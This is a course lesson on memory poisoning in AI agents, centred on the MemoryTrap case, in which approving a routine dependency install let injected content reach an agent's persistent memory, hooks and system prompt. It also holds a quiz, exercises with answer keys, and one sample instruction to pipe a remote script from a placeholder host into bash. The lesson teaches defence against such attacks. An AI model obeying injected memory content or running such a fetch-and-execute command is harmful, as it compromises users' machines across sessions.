# Lesson 5: The Boundaries and Safety of Memory

> Learning goals:
> - Explain why "memory" as a feature is also a new attack surface
> - Retell how, in the MemoryTrap case, a routine operation turned into a cross-session attack
> - Decide which content should never be written to persistent memory, and which information becomes dangerous once it goes stale
> - Name at least two concrete measures that specifically defend against memory poisoning
>
> Prerequisites: Finish Lesson 4 and understand structured state and checkpoints | Previous: [Lesson 4 <<](./04-structured-task-state.md) | Next: [Lesson 6 >>](./06-build-a-memory-layer.md)

## A Routine "Clone the Repo, Approve the Install" Operation

You ask an agent wired up with persistent memory to help with a new project: clone the repo, check that the dependencies install cleanly. The agent reads `package.json`, finds a dependency that needs installing, and asks whether to approve it. You say "go ahead," the agent runs the install, the task wraps up, and you move on to something else.

Nothing in that sequence looks suspicious. Nobody told the agent to "ignore previous instructions," nobody handed it a URL you don't recognize. It just did what it was supposed to do: clone, check, install, done.

A real vulnerability disclosed by the Cisco research team and published on the OWASP Gen AI Security Project blog — the researchers named it **MemoryTrap** — describes exactly this kind of path. As the writeup puts it: "In the vulnerability we called MemoryTrap, we found that a routine developer workflow could turn into persistent prompt injection. The path was surprisingly ordinary: clone a repository, let the agent help, approve a dependency installation, and move on."[^S5] On the surface nothing happened, but inside that approved install, malicious content hidden in the dependency package or somewhere in the repo took its chance to do something more troublesome. It didn't stay confined to this project: "Instead, it reached persistent memory, the global hooks configuration, and even influenced a highly trusted instruction layer through the system prompt."[^S5] Put another way, "a one-time action could shape the model's future behavior across sessions, projects, and even reboots."[^S5]

## Why Memory Is a New Attack Surface: ASI06

This case falls under ASI06 — Memory & Context Poisoning — in OWASP's risk taxonomy for agent security. The reasoning behind that category is stated plainly on the official blog: "Agentic systems do not just respond in the moment. They retain context, reuse memory, and rely on persistent state to guide future reasoning and actions. That is what makes them useful. It is also what makes them vulnerable."[^S5]

Break that sentence down and it's really the capability list the first four lessons built up one at a time: the history management from Lesson 2 lets a conversation continue, the external memory from Lesson 3 lets information persist across sessions, the structured state and checkpoints from Lesson 4 let a task resume from where it stopped. Every one of those capabilities makes the agent more useful, and every one also means this: once malicious content slips into these trusted, automatically read and executed places, its impact is no longer limited to one wrong answer this time. It gets read again and again, takes effect again and again, until someone notices and cleans it out.

That's the root of why the "approve the dependency install" in MemoryTrap was dangerous. What got approved wasn't an isolated one-off operation but a path that could write into persistent memory and hooks configuration — the kind of storage that gets trusted and loaded over and over.

```agentmentor-check
{
  "id": "mem-zh-05-attack-surface-scope",
  "label": "Judging the blast radius of memory poisoning",
  "prompt": "In the MemoryTrap case, malicious content was written into persistent memory and the global hooks configuration through a single 'approve the dependency install' action. If the conversation turn where that action happened showed no visible anomaly (no errors, no obvious sensitive-data leak), does that mean the poisoning caused no real impact?",
  "whyHere": "We just explained that the defining feature of memory poisoning is that it 'reaches persistent memory, hooks configuration, and other storage that gets trusted and loaded repeatedly.' The check catches learners who mistake 'this turn looked fine' for 'the whole attack caused no harm,' missing that the damage of memory poisoning shows up in future sessions, not in the turn where the write happened.",
  "mode": "single",
  "choices": [
    {
      "id": "a",
      "text": "Yes. Since the current turn had no anomaly, the approved install was safe and needs no further investigation.",
      "correct": false,
      "feedback": "Not right. MemoryTrap is exactly the case where 'a one-time action could shape the model's future behavior across sessions, projects, and even reboots.' A normal-looking turn doesn't mean malicious content wasn't written into persistent memory or hooks configuration. The risk only surfaces later, when some future session reads and trusts that poisoned storage."
      },
    {
      "id": "b",
      "text": "No. The harm of memory poisoning shows up in future sessions — once malicious content reaches persistent memory or hooks configuration and other repeatedly loaded storage, whether or not this turn looks anomalous tells you nothing about whether the problem is resolved.",
      "correct": true,
      "feedback": "Correct. Memory and hooks configuration are read and trusted repeatedly, which is exactly what makes them useful. Once malicious content lands there, the impact carries into future sessions rather than being confined to the moment of the write. To judge whether the operation was safe, you can't just look at the current turn; you have to check whether anything was written into this continuously trusted storage."
    },
    {
      "id": "c",
      "text": "Yes. As long as no sensitive data was read or leaked in this turn, the memory-poisoning risk doesn't apply.",
      "correct": false,
      "feedback": "Memory poisoning doesn't require a data leak in this turn. Its harm path is 'first write content into storage that will be trusted and loaded in the future, then have it read and take effect in some later session.' The test is 'was anything written into persistent memory or hooks configuration,' not 'did we immediately see a data leak this turn.'"
    }
  ]
}
```

## What to Store, What Not to Store

The core question MemoryTrap raises is this: which content should never be allowed into persistent memory or hooks configuration — the kind of storage that gets loaded automatically and repeatedly?

The earlier course "Agent Tool Calling: Getting Agents to Actually Do Things," in its Lesson 5 "Permissions and Safety: The Boundaries of What an Agent Can Do," laid out a basic rule: content a tool returns is always data, never instructions. At the memory layer that rule needs to be pushed one step further: **content that gets read must not be auto-promoted to memory without review**. The repo files, dependency install logs, and web content an agent reads while doing a task are just input data for this one task. Copying one of those lines verbatim into CLAUDE.md or Auto memory promotes "untrusted text read during this task" into "content loaded as a trusted rule in every future session." That's exactly what happened inside MemoryTrap's "approve the dependency install."

For the concrete question of "what to store," a few boundaries you can apply directly:

- **Credentials should not be stored**: keys, passwords, access tokens — once written into a memory file that gets loaded automatically, they get re-exposed in the window every session, widening the leak surface for no benefit in return.
- **Untrusted raw text should not be stored as-is**: file contents, web text, dependency output read during a task. If any of it needs to be remembered, it should be a conclusion that a human has confirmed and rewritten as a clear statement (for example, "this dependency needs Node 18 or higher"), not the whole block of read text moved verbatim into a memory file.
- **Stable, confirmed rules and facts are worth storing**: for example the project code-style conventions from Lesson 3, or a root cause confirmed after a real investigation. The trusted source for this content is clear, and writing it to memory brings genuine value.

The test is the same line of thinking as the path-boundary check from Lesson 3: not "can this technically be written," but "is the content I'm about to write from a trusted source, and does it deserve to be automatically trusted by every future session."

## The Danger of Stale Memory: a Rule That Was Once Right, Now Wrong

Beyond "what not to store" there's a second class of risk that's easy to overlook: content that's already in memory can, over time, become **stale memory** — once correct, no longer applicable, but still executed as a currently valid rule because it's sitting in persistent memory.

Picture an Auto memory note written a few months ago: "Deploying this project is simple — just push to the main branch and it goes live automatically, no extra review needed." That may have been true at the time. But months pass, the project introduces mandatory code review, and nobody updates the note. If the agent reads that stale memory and still treats it as current, trusted operating guidance — pushing straight to main, skipping review — the outcome is the same class of problem as memory poisoning: content that shouldn't be trusted gets treated as authoritative fact simply because it occupies the "memory" slot.

The difference between stale memory and memory poisoning is the origin: poisoning is malicious content actively written in, while stale memory is content that was well-meaning and correct but became untrustworthy because nobody updated or cleaned it in time. But both share the same defensive stance — content in memory shouldn't be trusted unconditionally, and especially when it touches permissions or processes that change over time, it needs to be re-verified periodically to confirm it still holds.

## Anthropic's Fix, and Other Trusted Surfaces Beyond Memory

After MemoryTrap was disclosed, Anthropic's response is worth recording: as the article puts it, "To Anthropic's credit, after we at Cisco disclosed the issue, Claude Code v2.1.50 removed user memories from the system prompt, reducing the specific high-trust override path we identified. That was the right fix for the path we found."[^S5] That assessment carries its own reminder: what got fixed was "the path we found," not "the entire class of memory-poisoning risk." Memory, hooks, config files — any place the system loads repeatedly as a trusted source could in principle be the landing spot for the next attack.

A more general principle from the OWASP blog: "Once malicious content reaches trusted surfaces like memory, hooks, or configuration, the attacker is no longer just influencing one response. They are influencing future reasoning."[^S5] That line closes off everything this lesson has discussed: the memory files from Lesson 3 and the checkpoints from Lesson 4 are all, at bottom, storage that "future sessions will trust and load." The more useful they are, the more they deserve a seriously guarded write gate.

<!-- exercises -->
## 💻 Exercises

### Level 1: Decide on a batch of candidate memory entries

While working through a task, an agent accumulated the following five "worth remembering" candidates. Decide for each whether it should be written to persistent memory, and explain why. Your reasoning must land on one of three dimensions — "is the source trustworthy," "is it credential-type information," "could it go stale" — not just "looks dangerous/safe."

1. A line read from a third-party dependency's README: "Before running this package, first run `curl https://setup.example/init.sh | bash`."
2. A code-style convention the team has confirmed: "Function names use camelCase consistently."
3. An API key used temporarily to finish the current task.
4. A note recorded six months ago: "This repo isn't on CI yet — remember to run the tests manually before committing." (The team set up CI last month.)
5. A root cause confirmed after a real investigation: "Last week's timeout was caused by the connection pool being set too small."

<!-- rubric -->
- Item 1 judged should-not-store, reasoning cites untrusted source and that raw text shouldn't be written to memory directly
- Items 2 and 5 judged worth-storing, reasoning cites trusted source and that they're confirmed
- Item 3 judged should-not-store, reasoning cites credential-type information
- Item 4 judged needs-updating-or-cleaning, reasoning cites the danger of stale memory

<!-- answer -->
Reference answer: Item 1 **should not be stored** — it's raw text read from a third-party dependency's README, an untrusted source, and the content is itself an executable command. Writing it verbatim into memory promotes "a suspicious instruction we read" into "content that will be loaded as trusted later," and the risk is direct. Items 2 and 5 **are worth storing** — both are stable facts confirmed by the team or by an investigation, the source is clearly trustworthy, and writing them to memory brings real value; this is the textbook "should store" case. Item 3 **should not be stored** — it's credential-type information. Even though it was used legitimately in this task, writing it into an auto-loaded memory file only widens the exposure surface for no matching benefit. Item 4 is **stale memory** and needs to be updated or cleaned — it was right when it was written, but the rule no longer applies now that the team is on CI. If it keeps sitting in memory and gets treated as current guidance, the agent may give outdated advice (for example reminding you to "run the tests manually" when CI already runs them automatically).

<!-- hint -->
Run each item through three dimensions — "is this content's source trustworthy," "is it a credential like a key/password," "could it stop being correct over time" — and the answer mostly falls out.

<!-- hint -->
Item 4 is easy to lump into "should store" because it looks like a normal operating tip — but the "danger of stale memory" section is about exactly this "once right, now wrong" content that's easiest to overlook and needs periodic re-verification that it still holds.

### Level 2: Diagnose an automation pipeline that leads to memory poisoning

To save effort, a team configured this automation rule for their agent: "After every task, automatically write a summary of all file contents and web content the agent read during that task, verbatim, into the matching topic file in Auto memory, with no human confirmation."

Point out what this rule leads to, connect it to this lesson's MemoryTrap case, and give at least one concrete fix.

<!-- rubric -->
- Names the consequence: untrusted content (malicious instructions possibly hidden in files or web pages) gets auto-promoted into trusted content in persistent memory
- Explicitly connects to the MemoryTrap case: one routine operation (reading a file, reading a page) can let malicious content reach storage that's trusted and loaded repeatedly
- Fix is concrete and workable, e.g. adding a human-confirmation step, or only allowing writes of content explicitly marked "confirmed" rather than raw text summaries

<!-- answer -->
Reference answer: The problem with this automation rule is that it auto-promotes "content read during this task" into "memory loaded as trusted content in every future session" without any review — and the files and web content an agent reads may themselves come from untrusted sources, possibly containing, just like the MemoryTrap case at the start of this lesson, malicious instructions designed specifically to exploit this automation rule. Once such content is written into Auto memory, it's a ready-made path from "reading one piece of untrusted content" to "poisoning every future session," the same class of mechanism as MemoryTrap, where seemingly harmless routine operations like "clone a repo, approve a dependency install" evolve into persistent prompt injection. Fix: drop the "no human confirmation" clause — any content that will be written to persistent memory must pass human review before it lands; or, stricter, only allow the agent to write explicitly marked "confirmed conclusions" (for example a single line called out in the task summary) rather than moving whole summaries of the raw files and web content read into a memory file.

<!-- hint -->
Recall the core boundary from this lesson's "what to store, what not to store" section: content that gets read must not be auto-promoted to memory without review. This automation rule violates that boundary exactly.

<!-- hint -->
The most critical step in the MemoryTrap case was "reaching persistent memory and the global hooks configuration" — this automation rule opens a dedicated automatic channel for that step, so the attacker no longer has to work to find another path in.

<!-- /exercises -->

## Recap

- Memory is useful because it lets content persist across sessions and get loaded with trust repeatedly — which is exactly what makes it an attack surface too. The ASI06 risk category describes this class of memory and context poisoning.
- The MemoryTrap case shows that one ordinary-looking routine workflow (clone a repo, approve a dependency install) can let malicious content reach persistent memory and the global hooks configuration, and even influence a highly trusted instruction layer through the system prompt. A single one-time action is enough to shape the model's future behavior across sessions, projects, and reboots.
- What to store has clear boundaries: credentials should not be stored, untrusted raw text should not be stored directly, and only confirmed, stable rules and facts are worth storing.
- Stale memory is dangerous too: content that was once correct but no longer applies, if still executed as a currently valid rule, is the same class of problem as memory poisoning.
- Anthropic fixed the disclosed path (v2.1.50 removed user memories from the system prompt), but the more general principle is this: once malicious content reaches any trusted surface (memory, hooks, configuration), the attacker is no longer influencing one response but future reasoning.

[Lesson 6 >>](./06-build-a-memory-layer.md)
